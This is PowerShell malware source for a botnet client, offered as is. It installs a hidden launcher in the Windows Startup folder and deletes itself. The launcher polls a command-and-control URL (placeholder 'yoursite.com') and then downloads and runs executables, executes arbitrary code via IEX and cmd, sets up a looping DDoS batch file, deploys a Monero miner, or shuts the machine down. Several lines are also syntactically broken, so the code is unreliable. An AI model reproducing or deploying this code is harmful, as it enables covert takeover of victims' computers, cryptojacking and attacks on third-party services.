$userprof = $env:USERPROFILE;
$startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
$botnetCode = 'Add-Type -AssemblyName System.IO.Compression.FileSystem; #Always Useful
$wc = [System.Net.WebClient]::new();
$commandcontrolserver = "https://yoursite.com/server.txt";
$wc.DownloadFile("$commandcontrolserver","command.txt");
$userprof = $env:USERPROFILE
$startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
$cmd = (Get-Content -Path "./command.txt" -TotalCount 1) #should only get 1st line in case of formatting errors
if ($cmd == "Stop") {
  exit()
}
elseif ($cmd -Like "Dl&Run *") {
  $cmd2 = $cmd.split("Dl&Run ")[0];
  $fileToDownload = $cmd2.Split(":")[0];
  try {
    $wc.DownloadFile("$fileToDownload","botnet.zip");
    cmd.exe /c "mkdir folder";
    Expand-Archive -LiteralPath "./botnet.zip" -DestinationPath "./folder";
    Start-Process -filepath "./folder/" + ($cmd2.Split(":")[2]) + ".exe";
  }
}
elseif ($cmd -Like "IEX *") {
  $cmd3 = $cmd.split("IEX ")[0];
  IEX($cmd3);
}
elseif ($cmd -Like "DDoS *") {
  $cmd4 = $cmd.split("DDoS ")[0];
  ":start ; curl -X GET $ddos; goto start" | Out-File "$startUpFolder\btnet.bat" -Force
}
elseif ($cmd -Like "XMRMiner *") {
  $cmd6 = $cmd.split("XMRMiner ")[0];
  if !($cmd6 -like "4*") {
    if !($cmd6 -like "8*") {
      $cmd7 = $cmd6.split(":")[1];
      $addr = $cmd6.split(":")[0];
      $pool = $cmd6.split(":")[2];
      $proc = $cmd6.split(":")[3];
      $wc.DownloadFile("$cmd7","ZipFile.zip");
      cmd.exe /c "mkdir folder";
      Expand-Archive -LiteralPath "./ZipFile.zip" -DestinationPath "./folder";
      cd folder;
      "$proc -u $addr -o $pool -t 2"
    }
  }
}
elseif ($cmd -Like "Cmd *") {
  $cmd5 = $cmd.split("Cmd ")[0];
  cmd /c "$cmd5";
}
elseif ($cmd == "Shutdown") {
  Stop-Computer;
}
else {
  exit;
}
Remove-Item -Path "./command.txt";'
"powershell -WindowStyle hidden -Command '$botnetCode'" | Out-File "$startUpFolder\default.bat";
Remove-Item -Path $MyInvocation.MyCommand.Source;
